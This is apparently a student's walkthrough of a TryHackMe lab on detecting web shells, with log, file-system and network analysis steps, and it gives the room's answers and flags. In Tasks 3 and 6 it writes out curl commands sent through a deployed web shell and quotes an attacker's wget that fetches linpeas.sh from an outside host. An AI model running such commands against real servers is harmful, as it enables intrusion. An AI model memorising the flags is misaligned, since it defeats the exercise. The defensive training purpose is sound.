# Detecting Web Shells

## Overview

In this room, we will explore web shell detection through analyzing logs, file systems, and network traffic.

<!--
**Answer:** > 

# Heading 1
## Heading 2
### Heading 3

For screenshots and captions
<div align="center">

*Caption here*

![alt text](image-url)

</div>


<a href=""></a>


### Command Executed
```bash

```

-->

## Task-1: Introduction

### Learning Objectives

- Understand what web shells are and how attackers use them
- Detect web shell activity through log, file system, and network analysis
- Understand common tooling in web shell detection

### Tools Used

- curl
- bash
- <a href="https://cyberchef.org">CyberChef</a>

### Prerequisites

- <a href="https://tryhackme.com/room/webapplicationbasics">Web Application Basics: Request Methods & Responses</a>
- <a href="https://tryhackme.com/room/introtologanalysis"> Intro to Log Analysis: Common Log Formats</a>
- <a href="https://tryhackme.com/room/mitre">MITRE: Initial Access & Tactics</a>

<h2>Questions</h2>

I understand the learning objectives and am ready to embark on a web shell adventure.

 > **Answer:** No answer needed

---

## Task-2: Web Shell Overview

<h2>Questions</h2>

<h3>Which MITRE ATT&CK Persistence sub-technique are web shells associated with?</h3>

This can be easily found with a quick internet search.

<div align="center">

*MITTRE ATT&CK Persistence Sub-Technique*

![MITRE ATT&CK Persistence Sub-Technique](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/Subtechnique.png)

</div>

 > **Answer:** T1505.003

<h2>What file extension is commonly used for web shells targeting Microsoft Exchange?</h2>

According to the examples presented in the lab of real-world web-shell deployment, the file extension commonly used for web shells targeting Microsoft Exchange is .aspx

> **Answer:** .aspx

---

## Task-3: Anatomy of a Web Shell

<h2>Questions</h2>

<h3>Access the shell and determine which account you have access to by running the whoami command.</h3>

I begin by going into the command line and using curl (a free and open source tool for tranferring data to and from a server using various protocols), and interact with the webshell(that has been depoloyed to the target machine on port 8080.

### Command Executed
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=whoami
```

### Command Output
```bash
www-data
```
<div align="center">

*whoami Command Executed on Deployed Web Shell*

![whoami](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/webshell_whoami.png)

</div>

Thus giving us our answer.

> **Answer:** www-data


<h3>List the directory contents and find the flag using the ls and cat commands.</h3>

When necessary, I made sure to URL encode my commands using CyberChef before interacting with the shell.

## Commands Executed

### Command 1 - ls
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=ls
```
### Command 1 - Output
```
bash
awebshell.php
flag.txt
```

### Command 2 - cat%20flag.txt
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=cat%20flag.txt
```

### Command 2 - Output
```bash
THM{W3b_Sh3ll_Usag3}
```
## Screencaptures

*I noticed that the URL encoding for a space (" ") is %20, which is something to keep note of for ease of reference!*

<div align="center>

*CyberChef URL Encode for cat flag.txt*
![CyberChef Encoding](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/urlencoding_cyberchef.png)

</div>

<div align="center>

*Listing out Directory Contents*

![Directory Contents](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/gettingflag_1.png)

</div>

<div align="center">

*Flag#1 Found!*

![Flag#1](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/flag1_acquired.png)

</div>

> **Answer:** THM{W3b_Sh3ll_Usag3}

---
## Task 4: Log-Based Detection

<h2>Questions</h2>

The answer to the below questions can be found through the task readings, however we will elaborate on each answer for learning sake

<h3>What is the part of the URL that associates values to parameters and can be a valuable indicator of web shell activity?</h3>

> **Answer:** query strings

Query strings are the part of the URL that come after the question mark '?' symbol, and web shells commonly use these to accept commands, making them a key indicator of malicious activity.

<h3>What auditd syscall would confirm that a file was written to disk following a suspicious POST request to /upload.php?</h3>

> **Answer:** creat

The "creat" system call is used to create new files of re-write existing ones. In this context, the correlation between a suspcious POST request and creation lies in the logs. The web logs show the attack itself occurred, while the audit logs show the result. 

Below are two examples with sample text that demonstrate this:

**Web Logs:**
```bash
POST /upload.php? HTTP/1.1
203.0.113.66 - - [04/May/2026 16:37:45] "POST /upload.php" 200
```
**Admin Logs:**
```bash
type=SYSCALL msg=audit(1715074425.123): pid=1234 syscall=creat name="/var/www/html/uploads/shell.php" success=yes
```
---
## Task 5: Beyond Logs

<h2>Questions</h2>

<h3>What command would you use to locate .php files in the /var/www/ directory?</h3>

> **Answer:** find /var/www/ -type f -name "*.php"

Let's break this down:

| Component      | Purpose     |
| ------------- | ------------- |
| ```find``` | Command that searches for files based on certain criteria |
| ```/var/www/``` | Starting directory |
| ```type -f``` | Only searches for regular files|
| ```name "*.php"``` | Matches filenames ending in ```.php``` |

<h3>Which Wireshark filter would you use to search specifically for PUT requests?</h3>

> **Answer:** http.request.method == "PUT"

The http.request.method is a wireshark search filter that filters packets based on the corresponding request method
The HTTP PUT method is used to upload or replace a file or resource on a web server.

Below is a table of all HTTP request methods, and their use cases depending on the context:

| Request Method | 	Normal Usage | Possible abuse |
| -------------- | ------------- | -------------- |
| GET |	Retrieve a resource | Used for recon or interacting with a web shell |
| POST |	Submit data to the server | Upload or interact with a web shell |
| PUT 	| Upload or replace a file on the server | 	Upload a web shell |
| DELETE |	Remove a resource from the server |	Cleanup methods |
| OPTIONS |	Requests methods that are supported |	Reconaissance |
| HEAD |	Similar to GET but only returns headers |	To detect files |

---

## Task 6: Investigation

<h2>Questions</h2>

<h3>Which IP address likely belongs to the attacker?</h3>

I began the investigation by reviewing the access log with cat (and grep for additional filtering) and establishing a baseline. I noticed there were 200 response codes, which indicate that a HTTP request successfully went through, from devices on the internal network. After analyzing further, I identified a suspicious user agent and external IP address.

### Command executed
```bash
cat /var/log/apache2/access.log | grep "200"
```

<div align="center">

*First Half of Access Logs*

![Access Logs](https://github.com/amoham001/Write-Ups/blob/afa59cdffe619d15677c36d493eaf98e1492ccc6/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/read_accesslog.png)

</div>

<div align="center">

*Suspicious User Agent & External IP*

![Access Logs - Suspcious IP Found](https://github.com/amoham001/Write-Ups/blob/afa59cdffe619d15677c36d493eaf98e1492ccc6/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/found_shadyIP.png)

</div>

> **Answer:** 203.0.113.66

<h3>What is the first directory that the attacker successfully identifies?</h3>

In my search of the access logs, I use the same command from above to filter for successful HTTP requests, looking at the GET requests and discerning the legitimate requests from the malicious ones. 

```bash
cat /var/log/apache2/access.log | grep "200"
```

<div align="center">

*First Directory Found by Attacker*

![Access Logs - First Directory Found by Attacker](https://github.com/amoham001/Write-Ups/blob/afa59cdffe619d15677c36d493eaf98e1492ccc6/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/firstdirfound_attacker.png)

</div>

And it seems the first directory found by the attacker during recon is /wordpress directory

> **Answer:** /wordpress

<h3>What is the name of the .php file the attacker uses to upload the web shell?</h3>

I used the command below to filter for HTTP POST requests to narrow down my search and help me identify which file the attacker used to upload the webshell

### Command Used
```bash
cat /var/log/apache2/access.log | grep "POST"
```

<div align="center">

*Name of .php File*
![.php file used to upload the web shell](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/shady_uploadform.png)
</div>


> **Answer:** upload_form.php

<h3>What is the first command run by the attacker using the newly uploaded web shell?</h3>

Shortly after uploading the shadyshell.php via the upload form, the interaction between the shell and the attacker can be seen through the subsequent GET requests that followed.

<div align="center">

*First command run by attacker*
![First command run by attacker](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/found_shellinteraction.png)
</div>

> **Answer:** whoami

<h3>After gaining access via the web shell, the attacker uses a command to download a second file onto the server. What is the name of this file?</h3>

Using the above screen capture as a reference, at [17/Jul/2025:06:18:39 +0000], the attacker can be observed executing the following command, which downloads, what is assumed to be a persistence script.
### Command
```bash
wget http://203.0.113.66:8000/linpeas.sh
```
> **Answer:** linpeas.sh

<h3>The attacker has hidden a secret within the web shell. Use cat to investigate the web shell code and find the flag.</h3>

Using the attacker's shell that was uploaded to the target server (Recall: shadyshell.php), I used the ls command to view the directory contents and low and behold, I found the flag!

```bash
curl http://10.64.135.10:8080/wordpress/wp-content/uploads/shadyshell.php?cmd=ls
```
<div align="center">

*Flag #2 Acquired!*
![Flag #2 Acquired](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/flag2_acquired.png)
</div>

> **Answer:** THM{W3b_Sh3ll_Int3rnals}
---
<h3>End Note</h3>

In this lab, I formed a solid understanding of detecting web shells using a combination of packet and network analysis. I felt I improved my ability in discerning traffic that is malicious from traffic that is benign.

Thank you all for following along, I hope my walkthrough was helpful!

You can find more of my walkthroughs <a href=https://github.com/amoham001/Write-Ups/tree/main/TryHackMe>here</a>
